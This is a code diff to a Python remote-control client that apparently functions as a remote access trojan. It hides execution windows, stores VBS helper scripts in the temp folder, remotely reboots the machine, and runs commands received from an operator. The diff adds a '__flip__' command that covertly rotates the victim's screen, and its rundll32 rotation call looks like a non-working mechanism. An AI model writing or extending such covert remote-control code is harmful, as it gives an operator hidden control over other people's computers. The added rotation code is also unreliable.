@@ -41,9 +41,10 @@ USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"
 
 device_id = None
 last_command_time = time.time()
-current_working_dir = os.getcwd()
+current_working_dir = 'C:\\Users'
 clipboard_file = None
 clipboard_cut = False
+screen_rotation = 0
 
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
@@ -284,6 +285,7 @@ def execute_shell_command(cmd_str):
     global current_working_dir
     global clipboard_file
     global clipboard_cut
+    global screen_rotation
 
     try:
         cmd_lower = cmd_str.lower().strip()
@@ -387,6 +389,17 @@ def execute_shell_command(cmd_str):
                 subprocess.Popen(["shutdown", "/r", "/t", seconds],
                     creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
                 return f"Reboot initiated ({seconds}s)" if seconds != "0" else "Reboot initiated"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle flip command (rotate display)
+        if cmd_lower.startswith("__flip__"):
+            try:
+                screen_rotation = (screen_rotation + 90) % 360
+                rotation_cmd = f"RotateScreenTo{screen_rotation}"
+                subprocess.Popen(["rundll32.exe", "display.dll", rotation_cmd],
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
+                return f"Display rotated to {screen_rotation} degrees"
             except Exception as e:
                 return f"Error: {str(e)}"
 
